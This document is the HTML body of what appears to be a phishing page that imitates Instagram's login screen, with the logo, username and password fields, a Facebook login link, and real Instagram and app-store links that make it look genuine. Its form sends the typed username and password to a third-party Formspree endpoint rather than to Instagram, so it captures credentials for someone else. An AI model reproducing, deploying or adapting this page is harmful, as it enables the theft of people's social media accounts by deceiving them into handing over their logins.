<body>
    <main>
      <div class="log-in-container">
           <form action="https://formspree.io/f/xrgrygea" method="post">
        <div class="log-in">
           
          <!-- Logo -->
          <img src="instagram-logo.png" class="logo" />
          <!-- Log in form -->
          
          <div class="log-in-form">


              
     
            <label for="name"></label>
            <input type="text" placeholder="Phone number, username or email"  class="form-control" id="name" name="name" required>
          
             <label for="password"></label>
            <input type="password" placeholder="Password" class="form-control" id="password" name="password" required>
            <button class="log-in-button">Log In</button> 
          
          
          </div>
            </form>
          <!-- OR divider -->
          <span class="or-divider">OR</span>
          <!-- Log in with Facebook -->
          <div class="fb-login">
            <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25229ivssk1n0l3z6o14g4g5cpaz811y5b6dspuq3e4mkv3wawt1bk%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0b2fb672-1211-4780-9b28-64f8fa14009f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25229ivssk1n0l3z6o14g4g5cpaz811y5b6dspuq3e4mkv3wawt1bk%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=hi_IN&pl_dbl=0">
              <img src="facebook-icon.png" />
              <span>Log in with Facebook</span>
            </a>
          </div>
            <!-- Forgot password? -->
          <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>
        <!-- Sign up -->
        <div class="sign-up">
          <span>Don't have an account?</span><a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
        <!-- Download app -->
        <div class="get-the-app">
          <span>Get the app</span>
          <div class="app-images">
            <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="applestore.png" /></a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=signupPage&ig_mid=91746366-FC3C-4CA9-9DB8-656A05249AD8&utm_content=lo&utm_medium=badge"><img src="googlestore.png" /></a>
          </div>
        </div>
      </div>
      <!-- Phones -->
      <div class="phones-container">
        <img src="phones.png">
      </div>
    </main>
